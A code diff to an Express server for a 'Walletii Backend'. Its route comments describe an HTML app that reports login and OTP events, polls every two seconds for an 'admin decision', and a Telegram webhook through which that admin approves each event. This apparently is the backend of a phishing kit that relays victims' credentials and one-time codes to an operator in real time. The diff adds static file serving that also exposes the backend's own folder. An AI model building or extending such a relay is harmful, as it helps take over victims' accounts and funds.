@@ -3,6 +3,7 @@
 // ══════════════════════════════════════════════════════
 //  server.js — Walletii Backend
 //  Routes:
+//    GET  /          ← serves index.html
 //    POST /notify   ← called by the HTML app (login or OTP event)
 //    POST /poll     ← called by the HTML app every 2s to check admin decision
 //    POST /webhook  ← called by Telegram when admin clicks a button
@@ -10,22 +11,29 @@
 //    GET  /health   ← Render health check
 // ══════════════════════════════════════════════════════
 
-import express   from 'express';
-import cors      from 'cors';
-import crypto    from 'crypto';
-import config    from './config.js';
+import express            from 'express';
+import cors               from 'cors';
+import crypto             from 'crypto';
+import { fileURLToPath }  from 'url';
+import path               from 'path';
+import config             from './config.js';
 import { setResult, popResult } from './store.js';
 import { sendAdminMessage, editMessage, answerCallback, registerWebhook, escMd } from './telegram.js';
 
-const app = express();
+const app       = express();
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
 // ── Middleware ──
 app.use(express.json());
 app.use(cors({
-  origin:  config.appUrl,
-  methods: ['GET', 'POST', 'OPTIONS'],
+  origin:      config.appUrl,
+  methods:     ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
 }));
+
+// ── Serve static files & index.html ──
+app.use(express.static(__dirname));
+app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 // ════════════════════════════════════════════════════════
 //  GET /health
